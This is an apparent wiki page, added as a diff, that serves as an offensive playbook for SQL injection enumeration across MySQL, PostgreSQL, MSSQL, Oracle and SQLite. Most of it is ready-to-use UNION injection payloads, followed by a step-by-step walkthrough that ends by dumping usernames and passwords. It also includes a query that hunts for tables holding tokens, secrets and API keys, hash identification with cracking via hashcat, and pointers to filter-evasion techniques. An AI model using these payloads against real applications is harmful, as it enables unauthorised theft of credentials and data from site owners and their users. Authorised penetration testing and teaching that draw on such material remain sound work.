@@ -1,0 +1,242 @@
+---
+title: SQLi Database Enumeration
+description: Enumerating databases, tables, columns, and data via information_schema and equivalents.
+mitre: [T1190, T1213]
+d3fend: [D3-MH, D3-MA]
+impact: [DataExfil]
+owasp: [A05]
+sidebar:
+  order: 5
+  label: Enumeration
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+Once you have a working UNION or other extraction primitive, walk the schema systematically: databases → tables → columns → data.
+
+## TL;DR (MySQL/MariaDB, 4 columns reflected)
+
+```sql
+-- All databases
+' UNION SELECT NULL, schema_name, NULL, NULL FROM information_schema.schemata-- -
+
+-- Tables in a specific DB
+' UNION SELECT NULL, table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema='<DB>'-- -
+
+-- Columns in a specific table
+' UNION SELECT NULL, column_name, table_name, NULL FROM information_schema.columns WHERE table_name='<TABLE>'-- -
+
+-- Dump data
+' UNION SELECT NULL, <COL1>, <COL2>, NULL FROM <DB>.<TABLE>-- -
+```
+
+## The schema metadata interface
+
+Every major DBMS exposes its schema through a metadata interface. The query shape changes per engine but the workflow is identical.
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / MariaDB">
+    ```sql
+    -- Current database name
+    SELECT database();
+
+    -- All databases
+    SELECT schema_name FROM information_schema.schemata;
+
+    -- Tables in current DB
+    SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+
+    -- Tables in any DB
+    SELECT table_name FROM information_schema.tables WHERE table_schema='<DB>';
+
+    -- Columns in a table
+    SELECT column_name, data_type FROM information_schema.columns WHERE table_name='<TABLE>';
+
+    -- All columns in all tables (compact)
+    SELECT GROUP_CONCAT(table_name, '.', column_name SEPARATOR '\n')
+      FROM information_schema.columns
+      WHERE table_schema=database();
+    ```
+
+    Default schemas to ignore: `information_schema`, `mysql`, `performance_schema`, `sys`.
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    -- Current database
+    SELECT current_database();
+
+    -- All databases
+    SELECT datname FROM pg_database;
+
+    -- Tables in current DB
+    SELECT table_name FROM information_schema.tables WHERE table_schema='public';
+
+    -- Columns
+    SELECT column_name, data_type FROM information_schema.columns WHERE table_name='<TABLE>';
+
+    -- All non-system tables
+    SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    -- Current database
+    SELECT DB_NAME();
+
+    -- All databases
+    SELECT name FROM master..sysdatabases;
+    SELECT name FROM sys.databases;
+
+    -- Tables
+    SELECT name FROM <DB>..sysobjects WHERE xtype='U';
+    SELECT TABLE_NAME FROM <DB>.INFORMATION_SCHEMA.TABLES;
+
+    -- Columns
+    SELECT name FROM <DB>..syscolumns WHERE id=OBJECT_ID('<DB>..<TABLE>');
+    SELECT COLUMN_NAME FROM <DB>.INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='<TABLE>';
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    -- Current user (Oracle has no per-database concept; user owns schema)
+    SELECT user FROM dual;
+
+    -- All accessible tables
+    SELECT table_name FROM all_tables;
+    SELECT owner, table_name FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM','XDB');
+
+    -- Columns
+    SELECT column_name, data_type FROM all_tab_columns WHERE table_name='<TABLE>';
+
+    -- Current user's tables only
+    SELECT table_name FROM user_tables;
+    ```
+  </TabItem>
+  <TabItem label="SQLite">
+    ```sql
+    -- All tables (SQLite has no information_schema)
+    SELECT name FROM sqlite_master WHERE type='table';
+
+    -- Schema of a specific table
+    SELECT sql FROM sqlite_master WHERE type='table' AND name='<TABLE>';
+
+    -- Columns via PRAGMA (only works in some contexts)
+    SELECT name FROM pragma_table_info('<TABLE>');
+    ```
+  </TabItem>
+</Tabs>
+
+## Workflow in practice
+
+Assume an `id` parameter, MySQL, 4 columns, position 2 reflected.
+
+<Steps>
+
+1. **Fingerprint:**
+   ```
+   ' UNION SELECT NULL,@@version,NULL,NULL-- -
+   ```
+
+2. **Current database:**
+   ```
+   ' UNION SELECT NULL,database(),NULL,NULL-- -
+   → "appdb"
+   ```
+
+3. **List tables in appdb:**
+   ```
+   ' UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ','),NULL,NULL
+     FROM information_schema.tables WHERE table_schema='appdb'-- -
+   → "users,posts,sessions,migrations"
+   ```
+
+4. **Get columns of users:**
+   ```
+   ' UNION SELECT NULL,GROUP_CONCAT(column_name SEPARATOR ','),NULL,NULL
+     FROM information_schema.columns WHERE table_name='users'-- -
+   → "id,username,password,email,role,created_at"
+   ```
+
+5. **Dump credentials:**
+   ```
+   ' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL,NULL
+     FROM users-- -
+   ```
+
+</Steps>
+
+## Identifying high-value tables fast
+
+Names worth grepping for across all tables:
+
+```
+users, accounts, members, customers, employees, admins, staff
+auth, login, credentials, passwords, secrets, tokens, sessions
+config, settings, options, env
+api_keys, oauth, jwt
+payment, card, billing
+```
+
+Compact hunt query (MySQL):
+
+```sql
+' UNION SELECT NULL,GROUP_CONCAT(table_schema,'.',table_name SEPARATOR '\n'),NULL,NULL
+  FROM information_schema.tables
+  WHERE table_name REGEXP 'user|auth|cred|pass|secret|token|admin|api_key'
+    AND table_schema NOT IN ('mysql','information_schema','performance_schema','sys')-- -
+```
+
+## Hashed passwords
+
+Stored passwords are usually hashed. After dumping, identify the hash format:
+
+| Length | Likely hash |
+|---|---|
+| 32 hex | MD5 |
+| 40 hex | SHA-1 |
+| 64 hex | SHA-256 |
+| Starts with `$2a$`, `$2b$`, `$2y$` | bcrypt |
+| Starts with `$argon2` | Argon2 |
+| Starts with `$1$`, `$5$`, `$6$` | crypt MD5/SHA-256/SHA-512 |
+| `pbkdf2_sha256$...` | Django |
+
+Crack offline with `hashcat`. Use `hashcat --identify <file>` if unsure. See the credentials section of the Codex (when published) for cracking workflow.
+
+## Limit & offset for large result sets
+
+When `GROUP_CONCAT`/`STRING_AGG` truncates or output is one row at a time:
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL / PostgreSQL">
+    ```sql
+    ' UNION SELECT NULL,username,password,NULL FROM users LIMIT 1 OFFSET 0-- -
+    ' UNION SELECT NULL,username,password,NULL FROM users LIMIT 1 OFFSET 1-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL (legacy)">
+    ```sql
+    -- No OFFSET in older versions
+    ' UNION SELECT TOP 1 NULL,username,password,NULL FROM users WHERE id NOT IN (SELECT TOP <N> id FROM users)-- -
+    ```
+  </TabItem>
+  <TabItem label="Oracle">
+    ```sql
+    ' UNION SELECT NULL,username,password,NULL FROM (SELECT username,password,ROWNUM r FROM users) WHERE r=<N>-- -
+    ```
+  </TabItem>
+</Tabs>
+
+For blind enumeration where you can't see results directly, see [Boolean blind](../blind-boolean/) - same workflow, character-by-character extraction.
+
+<Aside type="tip">
+MySQL truncates `GROUP_CONCAT` at 1024 bytes by default. To dump more in one query:
+```sql
+SET SESSION group_concat_max_len = 1000000;
+```
+This requires stacked queries (rare in MySQL). Otherwise, paginate with `LIMIT/OFFSET`.
+</Aside>
+
+## Notes
+
+- `information_schema` queries are slower than direct table queries on large databases. If you only need a few specific tables and you can guess names, query them directly first.
+- Some apps deny queries containing `information_schema` as a string. See [Filter bypasses](../bypasses/) for evasion (concatenation, hex encoding, comment insertion).
+- In MySQL 8.0+, some `information_schema` views are restricted to users with appropriate privileges. If you can't enumerate tables but you know names, query them directly.
